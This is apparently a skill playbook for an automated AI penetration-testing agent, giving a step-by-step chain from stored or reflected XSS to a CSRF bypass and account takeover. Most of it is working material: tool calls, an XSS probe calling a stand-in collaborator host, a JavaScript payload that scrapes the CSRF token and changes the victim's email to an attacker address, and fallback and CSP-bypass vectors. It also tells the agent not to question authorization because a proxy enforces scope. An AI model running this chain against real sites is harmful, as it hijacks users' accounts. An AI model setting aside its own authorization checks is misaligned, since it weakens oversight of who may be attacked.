# C10_xss_to_csrf

Use a confirmed stored or reflected XSS to bypass CSRF protection and trigger a sensitive state-changing action in the victim's session. Stored XSS is the stronger primitive: the payload executes automatically when the victim loads the page, reads the current CSRF token from the DOM, and submits a forged request with the valid token — bypassing same-origin CSRF defenses without requiring any user interaction beyond page load. Scope is enforced by the daemon's egress proxy; the agent does not need to second-guess authorization for accepted targets.

---

## When to use

- A reflected or stored XSS has been confirmed on the target (from current or prior wave).
- The application uses CSRF tokens (double-submit cookie, synchronizer token, or custom header) that would otherwise block cross-site mutation.
- Sensitive state-changing endpoints exist: email-change, password-change, payment, admin action, account-delete.
- Bug-class hints include `xss`, `csrf`, `stored-xss`, `reflected-xss`, or `account-takeover`.

---

## Workflow

1. **Load assignment and identify the XSS injection point.**
   ```
   mantis_read_hunter_brief({ target_domain, wave, agent, egress_profile, block_internal_hosts })
   ```
   From prior wave handoffs or current surface analysis, locate the confirmed XSS sink (stored comment field, reflected search param, user profile bio, etc.).

2. **Confirm XSS execution context.**
   Inject a benign probe payload and verify execution in the response:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/comments", body: { content: "<img src=x onerror=fetch('http://attacker-collab.example.com/xss-confirm')>" }, auth_profile: "attacker", egress_profile })
   ```
   For reflected XSS: craft the URL and confirm the payload renders in the response body.
   Confirm the collaborator receives the HTTP callback.

3. **Identify the CSRF-protected sensitive action.**
   Locate the target endpoint and its CSRF token mechanism:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/account/settings", auth_profile: "victim", egress_profile })
   ```
   Parse the response for `<meta name="csrf-token">`, `<input name="_csrf">`, or custom header (`X-CSRF-Token`) patterns. Note the token extraction path.

4. **Craft CSRF-bypass XSS payload.**
   Write a payload that:
   a. Reads the CSRF token from the DOM.
   b. Submits the sensitive action using the victim's token.
   Example payload (adapt to application's token mechanism):
   ```javascript
   fetch('/account/settings').then(r=>r.text()).then(html=>{
     const tok = html.match(/csrf[_-]token['"]\s*content=['"]([^'"]+)/i)[1];
     fetch('/api/account/email',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':tok},body:JSON.stringify({email:'attacker@evil.com'}),credentials:'include'});
   });
   ```
   Inject this as a stored XSS payload:
   ```
   mantis_http_scan({ target_domain, method: "POST", path: "/api/comments", body: { content: "<script>PAYLOAD_HERE</script>" }, auth_profile: "attacker", egress_profile })
   ```

5. **Simulate victim page load (confirm payload fires).**
   Retrieve the page containing the stored XSS as the victim auth profile:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/comments/latest", auth_profile: "victim", egress_profile })
   ```
   Confirm the payload executes by checking the collaborator endpoint for the CSRF-protected request arrival, or by checking the victim's account state for the injected email address.

6. **Verify account state change.**
   After simulated execution, verify the sensitive action completed:
   ```
   mantis_http_scan({ target_domain, method: "GET", path: "/api/account/profile", auth_profile: "victim", egress_profile })
   ```
   Confirm the victim's email is now `attacker@evil.com` or the targeted field changed.

7. **Test alternative token-bypass vectors.**
   If the above payload is blocked, try:
   - `fetch` with `credentials: 'include'` and no CSRF header (check if the endpoint validates the header at all).
   - `XMLHttpRequest` instead of `fetch` (different CORS behavior in some browsers).
   - Form submission via JS (`document.forms[0].submit()`) for non-JSON endpoints.
   - Read CSRF token from a cookie (`document.cookie`) if double-submit pattern is used.

8. **Log coverage.**
   ```
   mantis_log_coverage({ target_domain, wave, agent, surface_id, entries: [{ endpoint: "/api/account/email", method: "POST", bug_class: "xss_csrf_bypass", auth_profile: "victim", status: "promising"|"tested", evidence_summary: "Stored XSS in /api/comments executed CSRF-bypassed email-change on victim" }] })
   ```

9. **Record chain attempt.**
   ```
   mantis_record_chain_attempt({ target_domain, wave, agent, surface_id, chain_id: "xss-to-csrf-ato", step: "email_change_confirmed", evidence: "Victim email changed to attacker@evil.com via XSS-extracted CSRF token", outcome: "finding_recorded" })
   ```

10. **Record finding.**
    Call `mantis_list_findings` first:
    ```
    mantis_record_finding({ target_domain, wave, agent, surface_id, auth_profile: "attacker", title: "Stored XSS → CSRF bypass → victim email-change", severity: "critical", cwe: "CWE-79", endpoint: "/api/comments (XSS) → /api/account/email (CSRF action)", description: "...", proof_of_concept: "<injected payload, victim page load, resulting email change>", response_evidence: "...", impact: "Attacker achieves account takeover by injecting XSS that reads CSRF token and changes victim email", validated: true })
    ```

11. **Write handoff.**
    ```
    mantis_write_handoff({ target_domain, wave, agent, surface_id, surface_status: "complete"|"partial", summary: "...", chain_notes: ["XSS-CSRF chain confirmed ATO path; feeds C12", "Stored XSS may also be used for session-token theft if not HttpOnly"] })
    ```

12. **Open verification attempt.**
    ```
    mantis_open_verification_attempt({ target_domain, wave, agent, surface_id, finding_id: "F-N", method: "xss_replay_fresh_victim", notes: "Reset victim email; re-inject payload; confirm end-to-end in fresh session" })
    ```

---

## Evidence requirements

Record via `mantis_record_finding`:
- Full XSS injection request and response confirming the payload is stored/reflected.
- Full JavaScript payload used for CSRF bypass (annotated, not obfuscated).
- Evidence the payload executed: collaborator HTTP callback or account-state change.
- Before-and-after victim account state (email field, or targeted sensitive field).
- CSRF token value extracted by the payload (to confirm it was a real token, not bypassed by absent validation).

---

## Stop conditions

- XSS sink confirmed but CSRF-protected endpoint also enforces `SameSite=Strict` cookies — XSS cannot bypass SameSite. Record XSS as standalone finding; stop this chain.
- Content Security Policy blocks `fetch`/XHR/inline script execution — record CSP as a mitigating control, test for CSP bypass (nonce/hash bypass, JSONP gadget, `script-src 'unsafe-inline'` misconfig).
- Sensitive actions require re-authentication (password confirmation) before executing — XSS alone cannot bypass.
- Two WAF blocks on XSS payload variants — log, mark WAF-blocked, stop.
- Budget at 140 turns — wrap current test, write handoff.

---

## Failure modes / false positives to avoid

- **Reflected XSS requiring user click.** A reflected XSS with no stored persistence requires the victim to click a crafted URL. This is still valid but has lower impact than stored. Adjust severity to `high` rather than `critical` unless a realistic delivery mechanism exists.
- **HttpOnly cookies.** If the session cookie is HttpOnly, XSS cannot steal the cookie. However, XSS can still perform same-origin requests with the cookie attached automatically — the CSRF-bypass chain remains valid.
- **Self-XSS.** Do not record a finding where the attacker can only inject into their own account's private fields. Confirm cross-user delivery.
- **CSP false safe.** A `Content-Security-Policy` header does not automatically block the chain if the CSP has `unsafe-inline`, a broad `script-src`, or an injectable JSONP endpoint on the same origin.

---

## Next chain

Feeds into **C12_account_takeover** (email-change → password-reset → full ATO), **C8_csrf_to_sso** (use XSS to trigger SSO account-link CSRF), and **C5_idor_burst** (use XSS execution context to read other users' IDOR-accessible resources via same-origin fetch).
